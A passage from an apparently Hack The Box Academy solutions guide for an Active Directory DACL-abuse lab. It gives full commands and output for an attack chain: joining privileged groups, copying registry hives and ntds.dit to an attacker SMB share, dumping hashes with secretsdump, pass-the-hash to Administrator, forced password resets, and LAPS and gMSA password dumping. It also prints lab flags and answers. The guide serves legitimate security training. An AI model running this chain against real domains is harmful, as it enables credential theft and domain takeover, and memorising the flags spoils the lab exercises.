Subsequently, students need to use `dacledit.py` to enumerate `pedro`'s `ACEs` over `TestGroup`. Students will find out that `pedro` has `AllExtendedRights` over `TestGroup`; therefore, `pedro` can be added to `TestGroup`, making the account inherit the group's permissions:

Code: shell

```shell
python3 examples/dacledit.py -principal pedro -target TestGroup -dc-ip STMIP inlanefreight.local/pedro:SecuringAD01
```

```
(.dacledit) ┌─[eu-academy-1]─[10.10.14.246]─[htb-ac-413848@htb-vvzxupq7gq]─[~/impacket]
└──╼ [★]$ python3 examples/dacledit.py -principal pedro -target TestGroup -dc-ip 10.129.93.96 inlanefreight.local/pedro:SecuringAD01

Impacket v0.9.25.dev1+20221216.150032.204c5b6b - Copyright 2021 SecureAuth Corporation

[*] Parsing DACL
[*] Printing parsed DACL
[*] Filtering results for SID (S-1-5-21-1267651629-1192007096-1618970724-4617)
[*]   ACE[3] info                
[*]     ACE Type                  : ACCESS_ALLOWED_ACE
[*]     ACE flags                 : CONTAINER_INHERIT_ACE
[*]     Access mask               : ReadControl, AllExtendedRights, WriteProperties, ReadProperties, ListChildObjects (0x20134)
[*]     Trustee (SID)             : pedro (S-1-5-21-1267651629-1192007096-1618970724-4617)
```

Since it is `AllExtendedRights`, students can use `net` to add `pedro` to `TestGroup` (had it been `Self-MemberShip`, then they would have to use [addusertogroup.py](https://raw.githubusercontent.com/juliourena/ActiveDirectoryScripts/main/Python/addusertogroup.py) instead):

Code: shell

```shell
net rpc group addmem 'TestGroup' pedro -U inlanefreight.local/pedro%SecuringAD01 -S STMIP
```

```
┌─[eu-academy-1]─[10.10.14.232]─[htb-ac-413848@htb-s7655pdsj5]─[~]
└──╼ [★]$ net rpc group addmem 'TestGroup' pedro -U inlanefreight.local/pedro%SecuringAD01 -S 10.129.205.81
```

Afterward, students need to check the group's membership, assuring that `pedro` is a member of `TestGroup`:

Code: shell

```shell
net rpc group members 'TestGroup' -U inlanefreight.local/pedro%SecuringAD01 -S STMIP
```

```
┌─[eu-academy-1]─[10.10.14.232]─[htb-ac-413848@htb-s7655pdsj5]─[~]
└──╼ [★]$ net rpc group members 'TestGroup' -U inlanefreight.local/pedro%SecuringAD01 -S 10.129.205.81

INLANEFREIGHT\pedro
INLANEFREIGHT\carll
```

Students need to use `smbclient` to download the file "flag.txt" from the `SMB` share at `//STMIP/TestGroup`:

Code: shell

```shell
smbclient //STMIP/TestGroup -U inlanefreight.local/pedro%SecuringAD01 -c "get flag.txt"
```

```
┌─[eu-academy-1]─[10.10.14.246]─[htb-ac-413848@htb-vvzxupq7gq]─[~/impacket]
└──╼ [★]$ smbclient //10.129.93.96/TestGroup -U inlanefreight.local/pedro%SecuringAD01 -c "get flag.txt"

getting file \flag.txt of size 26 as flag.txt (2.8 KiloBytes/sec) (average 2.8 KiloBytes/sec)
```

At last, when reading the contents of the file "flag.txt", students will attain the flag `AllExt3ndeDRigths_AND_MOr3`:

Code: shell

```shell
cat flag.txt
```

```
┌─[eu-academy-1]─[10.10.14.246]─[htb-ac-413848@htb-vvzxupq7gq]─[~/impacket]
└──╼ [★]$ cat flag.txt

AllExt3ndeDRigths_AND_MOr3
```

Answer: `AllExt3ndeDRigths_AND_MOr3`

# AddMembers

## Question 2

### "Follow along the section and use Pedro's account to connect to DC01 using the Administrator's account hash. Submit the contents of the flag located at C:\\Users\\Administrator\\Desktop\\flag.txt as the answer."

First, students need to utilize `dacledit.py` to enumerate the `ACEs` that `pedro` has over `Backup Operators`. Students will find that `pedro` has `Self-Membership` over `Backup Operators`:

Code: shell

```shell
python3 examples/dacledit.py -principal pedro -target "Backup Operators" -dc-ip STMIP inlanefreight.local/pedro:SecuringAD01
```

```
(.dacledit) ┌─[eu-academy-1]─[10.10.14.246]─[htb-ac-413848@htb-vvzxupq7gq]─[~/impacket]
└──╼ [★]$ python3 examples/dacledit.py -principal pedro -target "Backup Operators" -dc-ip 10.129.93.96 inlanefreight.local/pedro:SecuringAD01

Impacket v0.9.25.dev1+20221216.150032.204c5b6b - Copyright 2021 SecureAuth Corporation

[*] Parsing DACL
[*] Printing parsed DACL
[*] Filtering results for SID (S-1-5-21-1267651629-1192007096-1618970724-4617)
[*]   ACE[0] info                
[*]     ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE
[*]     ACE flags                 : None
[*]     Access mask               : Self
[*]     Flags                     : ACE_OBJECT_TYPE_PRESENT
[*]     Object type (GUID)        : Self-Membership (bf9679c0-0de6-11d0-a285-00aa003049e2)
[*]     Trustee (SID)             : pedro (S-1-5-21-1267651629-1192007096-1618970724-4617)
[*]   ACE[8] info                
[*]     ACE Type                  : ACCESS_ALLOWED_ACE
[*]     ACE flags                 : None
[*]     Access mask               : ReadControl, ReadProperties, ListChildObjects (0x20014)
[*]     Trustee (SID)             : pedro (S-1-5-21-1267651629-1192007096-1618970724-4617)
```

Before attempting to add `pedro` to `Backup Operators`, students can check the group membership with `net`; only `carll` belongs to the group:

Code: shell

```shell
net rpc group members "Backup Operators" -U inlanefreight.local/pedro%SecuringAD01 -S STMIP
```

```
┌─[eu-academy-1]─[10.10.14.246]─[htb-ac-413848@htb-vvzxupq7gq]─[~/impacket]
└──╼ [★]$ net rpc group members "Backup Operators" -U inlanefreight.local/pedro%SecuringAD01 -S 10.129.93.96

INLANEFREIGHT\carll
```

Since `pedro` has the `validated write` `Self-Membership` `access right` over `Backup Operators`, students need to use [addusertogroup.py](https://raw.githubusercontent.com/juliourena/ActiveDirectoryScripts/main/Python/addusertogroup.py) to add `Pedro` to `Backup Operators` (had it been any other `AddMembers` `access right`, students could have used `net` instead):

Code: shell

```shell
wget https://raw.githubusercontent.com/juliourena/ActiveDirectoryScripts/main/Python/addusertogroup.py
```

```
┌─[eu-academy-1]─[10.10.14.246]─[htb-ac-413848@htb-vvzxupq7gq]─[~/impacket]
└──╼ [★]$ wget https://raw.githubusercontent.com/juliourena/ActiveDirectoryScripts/main/Python/addusertogroup.py

--2023-06-12 16:30:13--  https://raw.githubusercontent.com/juliourena/ActiveDirectoryScripts/main/Python/addusertogroup.py
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.109.133, 185.199.108.133, 185.199.111.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.109.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
<SNIP>
```

After downloading the script, students first need to update `/etc/hosts` to add an entry for the DC as `inlanefreight.local`:

Code: shell

```shell
sudo sh -c 'echo "STMIP inlanefreight.local" >> /etc/hosts'
```

```
┌─[eu-academy-1]─[10.10.14.246]─[htb-ac-413848@htb-vvzxupq7gq]─[~/impacket]
└──╼ [★]$ sudo sh -c 'echo "10.129.93.96 inlanefreight.local" >> /etc/hosts'
```

Subsequently, students need to use the script to add `pedro` to `Backup Operators`:

Code: shell

```shell
python3 addusertogroup.py -a pedro -g "Backup Operators" -u pedro -p SecuringAD01 -d inlanefreight.local
```

```
┌─[eu-academy-1]─[10.10.14.246]─[htb-ac-413848@htb-vvzxupq7gq]─[~/impacket]
└──╼ [★]$ python3 addusertogroup.py -a pedro -g "Backup Operators" -u pedro -p SecuringAD01 -d inlanefreight.local

[+] Connected to Active Directory successfully.
[+] Group Backup Operators found.
[+] User pedro found.
[+] User added to group successfully.
```

Students can verify the membership of `pedro` to `Backup Operators` using `net`:

Code: shell

```shell
net rpc group members "Backup Operators" -U inlanefreight.local/pedro%SecuringAD01 -S STMIP
```

```
┌─[eu-academy-1]─[10.10.14.246]─[htb-ac-413848@htb-vvzxupq7gq]─[~/impacket]
└──╼ [★]$ net rpc group members "Backup Operators" -U inlanefreight.local/pedro%SecuringAD01 -S 10.129.93.96

INLANEFREIGHT\pedro
INLANEFREIGHT\carll
```

Afterward, students need to exfiltrate the `SAM` and `SYSTEM` registry hives; first, students need to start an `SMB` server:

Code: shell

```shell
sudo smbserver.py -smb2support share .
```

```
┌─[eu-academy-1]─[10.10.14.246]─[htb-ac-413848@htb-vvzxupq7gq]─[~]
└──╼ [★]$ sudo smbserver.py -smb2support share .

Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

Then, students need to use [reg.py](https://github.com/fortra/impacket/blob/master/examples/reg.py) to retrieve the registry hives utilizing the account `Pedro` (in case students get the error message `[-] SMB SessionError: STATUS_PIPE_NOT_AVAILABLE(An instance of a named pipe cannot be found in the listening state.)`, they need to retry running the command until it works):

Code: shell

```shell
reg.py inlanefreight.local/pedro:SecuringAD01@STMIP backup -o '\\PWNIP\share'
```

```
┌─[eu-academy-1]─[10.10.14.246]─[htb-ac-413848@htb-vvzxupq7gq]─[~]
└──╼ [★]$ reg.py inlanefreight.local/pedro:SecuringAD01@10.129.93.96 backup -o '\\10.10.14.246\share'

Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

[!] Cannot check RemoteRegistry status. Hoping it is started...
[*] Saved HKLM\SAM to \\10.10.14.246\share\SAM.save
[*] Saved HKLM\SYSTEM to \\10.10.14.246\share\SYSTEM.save
[*] Saved HKLM\SECURITY to \\10.10.14.246\share\SECURITY.save
```

It is important to note that `reg.py` will not be able to exfiltrate `ntds.dit` with the account `Pedro` remotely; therefore, students need to exfiltrate it manually. To do so, students first need to connect to the spawned target machine with RDP utilizing the credentials `pedro:SecuringAD01`:

Code: shell

```shell
xfreerdp /v:STMIP /u:pedro /p:SecuringAD01 /dynamic-resolution
```

```
┌─[eu-academy-1]─[10.10.14.232]─[htb-ac-413848@htb-s7655pdsj5]─[~]
└──╼ [★]$ xfreerdp /v:10.129.205.81 /u:pedro /p:SecuringAD01 /dynamic-resolution

[16:28:20:154] [2615:2616] [INFO][com.freerdp.crypto] - creating directory /home/htb-ac-413848/.config/freerdp
[16:28:20:154] [2615:2616] [INFO][com.freerdp.crypto] - creating directory [/home/htb-ac-413848/.config/freerdp/certs]
[16:28:20:155] [2615:2616] [INFO][com.freerdp.crypto] - created directory [/home/htb-ac-413848/.config/freerdp/server]
[16:28:20:175] [2615:2616] [WARN][com.freerdp.crypto] - Certificate verification failure 'self signed certificate (18)' at stack position 0
[16:28:20:175] [2615:2616] [WARN][com.freerdp.crypto] - CN = DC01.INLANEFREIGHT.LOCAL
[16:28:20:175] [2615:2616] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[16:28:20:175] [2615:2616] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[16:28:20:175] [2615:2616] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[16:28:20:175] [2615:2616] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.129.6.141:3389) 
[16:28:20:175] [2615:2616] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[16:28:20:175] [2615:2616] [ERROR][com.freerdp.crypto] - Common Name (CN):
[16:28:20:175] [2615:2616] [ERROR][com.freerdp.crypto] - 	DC01.INLANEFREIGHT.LOCAL
[16:28:20:175] [2615:2616] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.129.6.141:3389 (RDP-Server):
	Common Name: DC01.INLANEFREIGHT.LOCAL
	Subject:     CN = DC01.INLANEFREIGHT.LOCAL
	Issuer:      CN = DC01.INLANEFREIGHT.LOCAL
	Thumbprint:  50:77:68:3c:b5:e7:ae:2c:a6:0b:17:88:46:b6:7f:72:85:f8:7a:f2:52:dd:23:85:cf:c8:16:b1:1c:f8:17:c8
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) yes
<SNIP>
```

Since the account `Pedro` is a member of `Backup Operators`, it has `SeBackupPrivilege`; therefore, students need to run PowerShell as `administrator`:

![[HTB Solutions/CAPE/z. images/2d3ec3a3bf9eebd4519863724365caf6_MD5.jpg]]

![[HTB Solutions/CAPE/z. images/f7ebb461c379bc15c3490bb2a1c743c5_MD5.jpg]]

Students can also ensure that `Pedro` has inherited the privileges of `Backup Operators`:

Code: powershell

```powershell
whoami /priv
```

```
PS C:\Windows\system32> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeMachineAccountPrivilege     Add workstations to domain     Disabled
SeBackupPrivilege             Back up files and directories  Disabled
SeRestorePrivilege            Restore files and directories  Disabled
SeShutdownPrivilege           Shut down the system           Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

Thereafter, students need to use the same `diskshadow` script provided in the section to make a `shadow copy` of the `C:` volume (the `system drive` that contains `ntds.dit`) and assign it the drive letter `p`, saving it in `C:\Users\Public\`:

Code: cmd

```cmd
set context persistent nowriters
set metadata C:\Windows\temp\file.cab
set verbose on
begin backup
add volume C: alias mydrive

create

expose %mydrive% p:
endbackup
```

Students then need to run [diskshadow.exe](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow) on the script:

Code: powershell

```powershell
diskshadow.exe /s C:\Users\Public\diskshadowscript.txt
```

```
PS C:\Windows\system32> .\diskshadow.exe /s C:\Users\Public\diskshadowscript.txt

Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  DC01,  6/12/2023 11:45:12 AM

-> set context persistent nowriters
-> set metadata C:\Windows\temp\file.cab
The existing file will be overwritten.
-> set verbose on
-> begin backup
-> add volume C: alias mydrive
->
-> create

Alias mydrive for shadow ID {fc1d4017-e58f-41bf-b2de-3737dfd4e4e1} set as environment variable.
Alias VSS_SHADOW_SET for shadow set ID {83a051e0-037f-4f26-b6d1-51c9e00f70dd} set as environment variable.
Inserted file Manifest.xml into .cab file file.cab
Inserted file Dis34E2.tmp into .cab file file.cab
<SNIP>
```

After the `shadow copy` has been created successfully, students need to use [robocopy.exe](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy) (`Roboust File Copy`) to copy the `ntds.dit` file from the `shadow copy` drive `P:\Windows\NTDS\` and save it at `C:\Users\Public\`:

Code: powershell

```powershell
.\Robocopy.exe /b P:\Windows\NTDS\ C:\Users\Public\ ntds.dit
```

```
PS C:\Windows\system32> .\Robocopy.exe /b P:\Windows\NTDS\ C:\Users\Public\ ntds.dit

-------------------------------------------------------------------------------
   ROBOCOPY     ::     Robust File Copy for Windows
-------------------------------------------------------------------------------

  Started : Monday, June 12, 2023 11:47:58 AM
   Source : P:\Windows\NTDS\
     Dest : C:\Users\Public\

    Files : ntds.dit

  Options : /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30

------------------------------------------------------------------------------

                           1    P:\Windows\NTDS\
100%        New File              44.0 m        ntds.dit

------------------------------------------------------------------------------

               Total    Copied   Skipped  Mismatch    FAILED    Extras
    Dirs :         1         0         1         0         0         0
   Files :         1         1         0         0         0         0
   Bytes :   44.00 m   44.00 m         0         0         0         0
   Times :   0:00:00   0:00:00                       0:00:00   0:00:00

   Speed :           163607602 Bytes/sec.
   Speed :            9361.702 MegaBytes/min.
   Ended : Monday, June 12, 2023 11:47:58 AM
```

Then, students need to transfer the `ntds.dit` file to `Pwnbox`/`PMVPN`. Using the same `SMB` server started previously, students can copy the file `ntds.dit` over with `copy`:

Code: powershell

```powershell
copy .\ntds.dit \\PWNIP\share\ntds.dit
```

```
PS C:\Windows\system32> copy .\ntds.dit \\10.10.14.246\share\ntds.dit
```

Now that the `SAM` and `SYSTEM` hives and `ntds.dit` are all exfiltrated, students need to use [secretsdump.py](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py) to dump the database's contents and attain the NT hash of `Administrator`, finding it to be `a678b5e7cc4c143b1d76a69ddf14c3ae`:

Code: shell

```shell
secretsdump.py -sam SAM.save -system SYSTEM.save -ntds ntds.dit LOCAL
```

```
┌─[eu-academy-1]─[10.10.14.246]─[htb-ac-413848@htb-vvzxupq7gq]─[~]
└──╼ [★]$ secretsdump.py -sam SAM.save -system SYSTEM.save -ntds ntds.dit LOCAL

Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

[*] Target system bootKey: 0x1b39bb8394e20baa2d7ffc0e85e6cbe2
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a678b5e7cc4c143b1d76a69ddf14c3ae:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 1636d5aaaf6cd0814af056f16001458e
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:f9ddbbd063ba0dc96c8593ef89fb639c:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:511c700cce0cb3c448734c69e04187f0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:dafbbaba2fef3addbba5b4fedfc38dab:::
<SNIP>
```

Students need to `pass-the-hash` `f9ddbbd063ba0dc96c8593ef89fb639c` with any tool that supports passing the hash such as [psexec.py](https://github.com/fortra/impacket/blob/master/examples/psexec.py), [wmiexec](https://github.com/fortra/impacket/blob/master/examples/wmiexec.py), [CrackMapExec](https://github.com/Porchetta-Industries/CrackMapExec), or [evil-winrm](https://github.com/Hackplayers/evil-winrm) to gain a shell on `STMIP` as `Administrator`; `wmiexec.py` will be used:

Code: shell

```shell
wmiexec.py Administrator@STMIP -hashes :f9ddbbd063ba0dc96c8593ef89fb639c
```

```
┌─[eu-academy-1]─[10.10.14.232]─[htb-ac-413848@htb-s7655pdsj5]─[~]
└──╼ [★]$ wmiexec.py Administrator@10.129.205.81 -hashes :f9ddbbd063ba0dc96c8593ef89fb639c

Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>more C:\Users\Administrator\Desktop\flag.txt

4bU$1nG_RIGths_wIth_DACLs
```

At last, when reading the contents of the file `C:\Users\Administrator\Desktop\flag.txt`, students will attain the flag `4bU$1nG_RIGths_wIth_DACLs`:

Code: cmd

```cmd
more C:\Users\Administrator\Desktop\flag.txt
```

```
C:\>more C:\Users\Administrator\Desktop\flag.txt

4bU$1nG_RIGths_wIth_DACLs
```

Answer: `4bU$1nG_RIGths_wIth_DACLs`

# Password Abuse

## Question 1

### "Change the credentials for the account Yolanda. Then, connect to the shared folder \\\\DC01\\yolanda\\ and submit the contents of flag.txt as the answer."

After spawning the target machine, students first need to clone the [ShutdownRepo impacket](https://github.com/ShutdownRepo/impacket) fork, create a Python virtual environment for it, and then install it:

Code: shell

```shell
git clone https://github.com/ShutdownRepo/impacket -b dacledit
cd impacket/
python3 -m venv .dacledit
source .dacledit/bin/activate
python3 -m pip install .
```

```
┌─[eu-academy-1]─[10.10.14.246]─[htb-ac-413848@htb-vvzxupq7gq]─[~]
└──╼ [★]$ git clone https://github.com/ShutdownRepo/impacket -b dacledit
cd impacket/
python3 -m venv .dacledit
source .dacledit/bin/activate
python3 -m pip install .

Cloning into 'impacket'...
remote: Enumerating objects: 22819, done.
remote: Counting objects: 100% (12/12), done.
remote: Compressing objects: 100% (6/6), done.
<SNIP>
```

Subsequently, students need to use `dacledit.py` to enumerate `pedro`'s `ACEs` over `yolanda`. Students will find out that `pedro` has `User-Force-Change-Password` over `Yolanda`; therefore, `pedro` can reset the password of `yolanda`:

Code: shell

```shell
python3 examples/dacledit.py -principal pedro -target yolanda -dc-ip STMIP inlanefreight.local/pedro:SecuringAD01
```

```
(.dacledit) ┌─[eu-academy-1]─[10.10.14.232]─[htb-ac-413848@htb-s7655pdsj5]─[~/impacket]
└──╼ [★]$ python3 examples/dacledit.py -principal pedro -target yolanda -dc-ip 10.129.205.81 inlanefreight.local/pedro:SecuringAD01

Impacket v0.9.25.dev1+20221216.150032.204c5b6b - Copyright 2021 SecureAuth Corporation

[*] Parsing DACL
[*] Printing parsed DACL
[*] Filtering results for SID (S-1-5-21-1267651629-1192007096-1618970724-4617)
[*]   ACE[0] info                
[*]     ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE
[*]     ACE flags                 : None
[*]     Access mask               : ControlAccess
[*]     Flags                     : ACE_OBJECT_TYPE_PRESENT
[*]     Object type (GUID)        : User-Force-Change-Password (00299570-246d-11d0-a768-00aa006e0529)
[*]     Trustee (SID)             : pedro (S-1-5-21-1267651629-1192007096-1618970724-4617)
```

To reset the password of `yolanda`, students can either use `net` or `rpcclient`; both tools will be shown, starting with the former. It is always a good `OpSec` practice to use cryptograhically secure passwords to prevent other threat agents from gaining access to compromised accounts, students can use `openssl` to generate one:

Code: shell

```shell
openssl rand -hex 12
```

```
┌─[eu-academy-1]─[10.10.14.232]─[htb-ac-413848@htb-mytwac9imd]─[~]
└──╼ [★]$ openssl rand -hex 12

367f4d86fa620b60b7208f9b
```

Now, students can use `net` to reset the password of `yolanda`:

Code: shell

```shell
net rpc password yolanda 367f4d86fa620b60b7208f9b -U inlanefreight.local/pedro%SecuringAD01 -S STMIP
```

```
┌─[eu-academy-1]─[10.10.14.232]─[htb-ac-413848@htb-s7655pdsj5]─[~]
└──╼ [★]$ net rpc password yolanda 367f4d86fa620b60b7208f9b -U inlanefreight.local/pedro%SecuringAD01 -S 10.129.205.81
```

Or, with `rpcclient` alternatively (`23` is the value of the field `UserInternal4Information` within the enum [\_USER\_INFORMATION\_CLASS](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/6b0dff90-5ac0-429a-93aa-150334adabf6)):

Code: shell

```shell
rpcclient -U inlanefreight.local/pedro%SecuringAD01 STMIP
setuserinfo2 yolanda 23 367f4d86fa620b60b7208f9b
exit
```

```
┌─[eu-academy-1]─[10.10.14.232]─[htb-ac-413848@htb-s7655pdsj5]─[~/impacket]
└──╼ [★]$ rpcclient -U inlanefreight.local/pedro%SecuringAD01 10.129.205.81

rpcclient $> setuserinfo2 yolanda 23 367f4d86fa620b60b7208f9b
rpcclient $> exit
```

Utilizing the credentials `yolanda:367f4d86fa620b60b7208f9b`, students need to use `smbclient` to download the file "flag.txt" from the `SMB` share at `//STMIP/yolanda`:

Code: shell

```shell
smbclient //STMIP/yolanda -U inlanefreight.local/yolanda%367f4d86fa620b60b7208f9b -c "get flag.txt"
```

```
┌─[eu-academy-1]─[10.10.14.232]─[htb-ac-413848@htb-s7655pdsj5]─[~/impacket]
└──╼ [★]$ smbclient //10.129.205.81/yolanda -U inlanefreight.local/yolanda%367f4d86fa620b60b7208f9b -c "get flag.txt"

getting file \flag.txt of size 30 as flag.txt (3.3 KiloBytes/sec) (average 3.3 KiloBytes/sec)
```

At last, when reading the contents of the file "flag.txt", students will attain the flag `Yolanda_Is_GooD_wIth_Computers`:

Code: shell

```shell
cat flag.txt
```

```
┌─[eu-academy-1]─[10.10.14.232]─[htb-ac-413848@htb-s7655pdsj5]─[~/impacket]
└──╼ [★]$ cat flag.txt

Yolanda_Is_GooD_wIth_Computers
```

Answer: `Yolanda_Is_GooD_wIth_Computers`

# Password Abuse

## Question 2

### "Use the account Yolanda to read the content of the LAPS password for LAPS07 and submit it as the answer."

Students first need to clone [LAPSDumper](https://github.com/n00py/LAPSDumper) and move directories into it:

Code: shell

```shell
git clone https://github.com/n00py/LAPSDumper -q && cd LAPSDumper
```

```
┌─[eu-academy-1]─[10.10.14.232]─[htb-ac-413848@htb-mytwac9imd]─[~]
└──╼ [★]$ git clone https://github.com/n00py/LAPSDumper -q && cd LAPSDumper
```

Then, students need to use `laps.py` with the username `yolanda` and password `367f4d86fa620b60b7208f9b` to read the `LAPS` password(s) that `Yolanda` is granted read permission on. Students will find that the `LAPS` password for `LAPS07` is `L%EG/p5g5@[F$s`:

Code: shell

```shell
python3 laps.py -u yolanda -p 367f4d86fa620b60b7208f9b -l STMIP -d inlanefreight.local
```

```
┌─[eu-academy-1]─[10.10.14.232]─[htb-ac-413848@htb-mytwac9imd]─[~/LAPSDumper]
└──╼ [★]$ python3 laps.py -u yolanda -p 367f4d86fa620b60b7208f9b -l 10.129.205.81 -d inlanefreight.local

LAPS Dumper - Running at 06-14-2023 11:52:28
LAPS01 s19I/p9J5@[F$s
LAPS02 y2QLPdd;T9u,]9
LAPS03 k3B,Ppp;T/u@!
LAPS04 a1@I/p9J5#2f26z
LAPS05 3#fbfDdd;/u,g]
LAPS06 $uEdljtz#pp;T/
LAPS07 L%EG/p5g5@[F$s
LAPS08 xl$KZP/dd;u,]9
LAPS09 Nzr$jIzT/JV4@!
```

Answer: `L%EG/p5g5@[F$s`

# Password Abuse

## Question 3

### "From the output of dacledit.py, what is the name of the Access Mask that allows Yolanda to perform a password reset to the Marcos account?"

Students need to use `dacledit.py` to enumerate `yolanda`'s `ACEs` over `Marcos` (with either the credentials `pedro:SecuringAD01` or `yolanda:367f4d86fa620b60b7208f9b`); students will find out that the `Access Mask` that allows `yolanda` to perform a password reset to the account `Marcos` is `All-ExtendedRights`:

Code: shell

```shell
python3 examples/dacledit.py -principal yolanda -target Marcos -dc-ip STMIP inlanefreight.local/pedro:SecuringAD01
```

```
(.dacledit) ┌─[eu-academy-1]─[10.10.14.232]─[htb-ac-413848@htb-mytwac9imd]─[~/impacket]
└──╼ [★]$ python3 examples/dacledit.py -principal yolanda -target Marcos -dc-ip 10.129.205.81 inlanefreight.local/pedro:SecuringAD01

Impacket v0.9.25.dev1+20221216.150032.204c5b6b - Copyright 2021 SecureAuth Corporation

[*] Parsing DACL
[*] Printing parsed DACL
[*] Filtering results for SID (S-1-5-21-1267651629-1192007096-1618970724-4616)
[*]   ACE[19] info                
[*]     ACE Type                  : ACCESS_ALLOWED_ACE
[*]     ACE flags                 : None
[*]     Access mask               : ReadControl, AllExtendedRights, ReadProperties, ListChildObjects (0x20114)
[*]     Trustee (SID)             : Yolanda (S-1-5-21-1267651629-1192007096-1618970724-4616)
```

Answer: `AllExtendedRights`

# Password Abuse

## Question 4

### "Abuse Marcos access rights to gain access to the gMSA account htb-svc$. Using the gMSA account credentials, read the contents of the flag at \\\\DC01\\GMSA\\flag.txt and submit it as the answer."

From the previous question, students know that `yolanda` has `AllExtendedRights` over `Marcos`, therefore, they first need to reset the password of `Marcos` using `net` (or `rpcclient`):

Code: shell

```shell
net rpc password marcos e19d9d97e4ff260b7cd59f35 -U inlanefreigt.local/yolanda%367f4d86fa620b60b7208f9b -S STMIP
```

```
┌─[eu-academy-1]─[10.10.14.232]─[htb-ac-413848@htb-mytwac9imd]─[~/LAPSDumper]
└──╼ [★]$ net rpc password marcos e19d9d97e4ff260b7cd59f35 -U inlanefreigt.local/yolanda%367f4d86fa620b60b7208f9b -S 10.129.205.81
```

Subsequently, students need to clone [gMSADumper](https://github.com/micahvandeusen/gMSADumper) and change directories into it:

Code: shell

```shell
git clone https://github.com/micahvandeusen/gMSADumper -q && cd gMSADumper/
```

```
┌─[eu-academy-1]─[10.10.14.232]─[htb-ac-413848@htb-mytwac9imd]─[~]
└──╼ [★]$ git clone https://github.com/micahvandeusen/gMSADumper -q && cd gMSADumper/
```

Then, students need to use `gMSADumper.py` with the credentials `marcos:e19d9d97e4ff260b7cd59f35` to steal the NT hash of the `htb-svc` account, finding it to be `59780ce259c0972c27372682f60c56f7`:

Code: shell

```shell
python3 gMSADumper.py -u marcos -p e19d9d97e4ff260b7cd59f35 -l STMIP -d inlanefreight.local
```

```
┌─[eu-academy-1]─[10.10.14.232]─[htb-ac-413848@htb-mytwac9imd]─[~/gMSADumper]
└──╼ [★]$ python3 gMSADumper.py -u marcos -p e19d9d97e4ff260b7cd59f35 -l 10.129.205.81 -d inlanefreight.local

Users or groups who can read password for mssql-dev$:
 > Agents
Users or groups who can read password for jenkins-dev$:
 > pedro
Users or groups who can read password for tomcat-dev$:
 > pedro
Users or groups who can read password for apache-dev$:
 > pedro
Users or groups who can read password for htb-svc$:
 > marcos
htb-svc$:::59780ce259c0972c27372682f60c56f7
htb-svc$:aes256-cts-hmac-sha1-96:cced6b2db6911a265341e6b3712c75b657155bde9a2e4c761c2016382384f145
htb-svc$:aes128-cts-hmac-sha1-96:fb8ebd74a891ec7bd7f3c367942351e5
```

Utilizing the username `htb-svc$` and the NT hash `59780ce259c0972c27372682f60c56f7`, students need to use `smbclient` to download the file "flag.txt" from the `SMB` share at `//STMIP/GMSA`:

Code: shell

```shell
smbclient //STMIP/GMSA -U 'inlanefreight.local/htb-svc$' --pw-nt-hash 59780ce259c0972c27372682f60c56f7 -c "get flag.txt"
```

```
┌─[eu-academy-1]─[10.10.14.232]─[htb-ac-413848@htb-mytwac9imd]─[~/gMSADumper]
└──╼ [★]$ smbclient //10.129.205.81/GMSA -U 'inlanefreight.local/htb-svc$' --pw-nt-hash 59780ce259c0972c27372682f60c56f7 -c "get flag.txt"

getting file \flag.txt of size 24 as flag.txt (1.8 KiloBytes/sec) (average 1.8 KiloBytes/sec)
```

